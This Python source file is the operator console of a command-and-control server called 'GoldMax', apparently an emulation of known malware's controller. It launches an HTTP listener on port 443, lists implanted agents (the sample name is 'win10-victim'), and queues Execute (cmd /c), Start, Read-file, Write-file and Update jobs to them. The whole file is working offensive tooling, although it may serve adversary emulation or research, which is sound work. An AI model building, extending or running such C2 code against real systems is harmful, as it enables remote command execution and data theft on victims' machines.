import multiprocessing
from cmd import Cmd
from time import sleep
from colorama import Fore as Color
from pyfiglet import Figlet
from prettytable import PrettyTable as Table
from toolbox.RedisDB import RedisDB
from toolbox.GoldHttp import start_http


def goldmax_cli():
    print(Color.BLUE)
    prompt = GoldMaxPrompt()
    prompt.banner()
    bash_prompt = Color.LIGHTBLUE_EX + '┌──(' + Color.RED + 'GoldMax' + Color.LIGHTBLUE_EX + ')─[' + '~' + ']' + '\n' + '└─$ '
    prompt.prompt = Color.BLUE + bash_prompt
    prompt.cmdloop()


class GoldMaxPrompt(Cmd):
    def __init__(self):
        self.bash_prompt = Color.LIGHTBLUE_EX + '┌──(' + Color.RED + 'GoldMax' + Color.LIGHTBLUE_EX + ')─[' + '~' + ']' + '\n' + '└─$ '
        self.agent = None
        self.job = None
        self.http_server = None
        self.state = False
        self.commands = {'Execute': 'Utilizes hardcoded value of cmd /c <args> and returns results',
                         'Start': 'Starts a process and returns "EXECED" if executed successfully',
                         'Read': 'Expects a full path to file and returns file contents. Need to try with binary files',
                         'Write': 'Expects file drop location and contents',
                         'Update': 'Currently updates the check interval for the agent'
                         }
        self.db = RedisDB()
        super().__init__()

    def update_prompt(self):
        """Add Agent"""
        if self.agent:
            self.prompt = self.bash_prompt.replace("~", self.agent)
    @staticmethod
    def banner():
        f = Figlet(font='shadow')
        print(Color.BLUE + f.renderText('GoldMax') + Color.RESET)

    def emptyline(self) -> bool:
        return False

    def complete_clear(self, *a):
        items = ['jobs', 'agents']
        return items

    def do_exit(self, inp) -> bool:
        """Shutting Down Arc Reactor"""
        self.do_stop(inp)
        return True

    def do_commands(self, inp):
        """
        Display supported GoldMax commands
        """
        print("[+] Available Commands: [+]")
        x = Table()
        x.field_names = ["Cmd", "Description"]
        x.align = "l"

        for cmd, description in self.commands.items():
            x.add_row([cmd, description])

        print(Color.YELLOW + str(x), Color.RESET)

    def do_agents(self, arg):
        """
        Display all Agents
        """
        x = Table()
        x.field_names = ["Agent", "C2", "LastCheckIn"]
        x.align = "c"

        agents = self.db.get_agents()

        if agents:
            for agent in agents.values():
                x.add_row([agent["Agent"], agent["C2"]["Host"], agent["LastCheckIn"]])
        else:
            print(Color.LIGHTYELLOW_EX, "[-] No Active Agents [-]\n")

        print(Color.LIGHTBLUE_EX + str(x), Color.RESET)

    def complete_set(self, text, line, begidx, endidx):
        # Autocomplete available agents
        if 'agent' in line:
            agents = []
            agent_db = self.db.get_agents()
            for agent in agent_db.values():
                agents.append(agent['Agent'])

            agent_name = line[begidx:endidx]
            # Do we know this agent
            if len(agent_name) >= 2:
                for agent in agents:
                    index = agent.find('-')
                    if agent_name in agent:
                        return [agent[index + 1:]]

            return agents

        # Autocomplete available jobs to set
        if line.endswith('job ') or line.endswith('job'):
            return ['Execute', 'Read', 'Write', 'Start', 'Update']

        elif line[begidx:endidx] == 'R' or line[begidx:endidx] == 'r':
            return ['Read']

        elif line[begidx:endidx] == 'E' or line[begidx:endidx] == 'e':
            return ['Execute']

        elif line[begidx:endidx] == 'W' or line[begidx:endidx] == 'w':
            return ['Write']

        elif line[begidx:endidx] == 's' or line[begidx:endidx] == 'S':
            return ['Start']

        elif line[begidx:endidx] == 'u' or line[begidx:endidx] == 'U':
            return ['Update']
        else:
            set_items = ['agent', 'job']

        return set_items

    def do_stop(self, arg):
        """Shutdown All Active Servers"""
        print(Color.RED, "Shutting Down any active servers...")
        if self.http_server:
            self.http_server.terminate()
            # Allow time to update state
            sleep(2)
            http_status = self.http_server.is_alive()

            if http_status is False:
                print(Color.GREEN, "Complete! HTTP server shutdown successfully\n")
        else:
            print(Color.YELLOW, "No servers running\n", Color.RESET)

    def do_start(self, arg):
        """
        Manually start C2 Server HTTP
        """
        http_port = 443
        active_servers = []
        if not self.http_server:
            # HTTP Server
            http_proc = multiprocessing.Process(target=start_http)
            http_proc.start()
            active_servers.append(http_proc)
            self.http_server = http_proc
        print(Color.LIGHTGREEN_EX, f"Server started:", Color.RESET)
        print(Color.WHITE, f" HTTP Listener on {http_port}\n", Color.RESET, Color.RESET)

    def do_set(self, args):
        items = args.split(' ')
        if len(items) > 1:
            if items[0] == 'agent':
                print(f'Setting Active Agent : {items[1]}\n')
                self.agent = items[1]
                self.update_prompt()

            elif items[0] == 'job' and self.agent is not None:
                job_args = items[1:]
                self.job = job_args
                print(f'Adding {job_args} to JobQueue for Agent : {self.agent}\n')
                self.db.insert_jobs(self.agent, job_args)
            else:
                print(Color.RED, "No Active Agent set!\n Example: set agent 'win10-victim'", Color.RESET)

    def do_jobs(self, arg):
        """Display Jobs"""

        # Pending jobs
        x = Table()
        x.field_names = ["Agent", "JobId", "Cmd"]
        pending_jobs = self.db.get_items("Pending")
        print(Color.LIGHTYELLOW_EX + "\n[-] Job Queue [-]\n")
        if pending_jobs:
            for job in pending_jobs.values():
                x.add_row([job['paw'], job['id'], job['cmd']])

            print(Color.LIGHTBLUE_EX + str(x), Color.RESET)
        else:
            print("None")

        # Active jobs
        y = Table()
        y.field_names = ["Agent", "JobId", "Cmd"]
        y.align = "l"
        active_jobs = self.db.get_items("Active")
        print(Color.LIGHTYELLOW_EX + "\n[+] Active Jobs [+]\n")
        if active_jobs:
            for job in active_jobs.values():
                y.add_row([job['paw'], job['id'], job['cmd']])
            print(Color.LIGHTBLUE_EX + str(y), Color.RESET)
        else:
            print("None")

        # Completed jobs
        completed_jobs = self.db.get_items("Done")
        print(Color.GREEN + "\n[+] Completed Jobs [+]\n")
        if completed_jobs:
            for job in completed_jobs:
                print(job["Results"])
        else:
            print("None")
        print(Color.RESET)

    def do_status(self, arg):
        """
        Show status of controller
        - Active servers
        - Known/Active agents
        """
        cleaned_jobs = ''
        pending_jobs = self.db.get_items("Pending")
        active_jobs = self.db.get_items("Active")

        # Agent Table
        x = Table()
        x.field_names = ['Agent Name', 'Jobs', 'Last Seen']
        x.align = 'l'

        # Get Job information for Agent
        if pending_jobs:
            cleaned_jobs = "PENDING:\n"
            for job in pending_jobs.values():
                cleaned_jobs += f"id: {job['id']}  command: {job['cmd']}\n"
                self.agent = job['paw']
        if active_jobs:
            cleaned_jobs += "\nACTIVE:\n"
            for job in active_jobs.values():
                cleaned_jobs += f"id: {job['id']}  command: {job['cmd']}\n"
                self.agent = job['paw']

        last_contact = self.db.get_last_checkin(self.agent)
        x.add_row([self.agent, cleaned_jobs, last_contact])
        print(Color.LIGHTBLUE_EX, '\n' + str(x), Color.RESET)

        # Server Table
        y = Table()
        server_status = False
        if self.http_server:
            server_status = self.http_server.is_alive()
        y.field_names = ['Servers', 'Status', 'Binding']
        y.add_row(["Http", server_status, "0.0.0.0:443"])
        print(Color.LIGHTGREEN_EX, '\n' + str(y), Color.RESET)

    def do_clear(self, arg):
        """

        """
        # Remove pending jobs
        if arg == 'jobs':
            print(Color.RED, '[-] Clearing all pending/active jobs [-]', Color.RESET)
            self.db.drop_table('Pending')
            self.db.drop_table('Active')

        if arg == 'agents':
            print(Color.RED, '[-] Removing all Known Agents [-]', Color.RESET)
            self.db.drop_table('Agents')


if __name__ == "__main__":
    goldmax_cli()
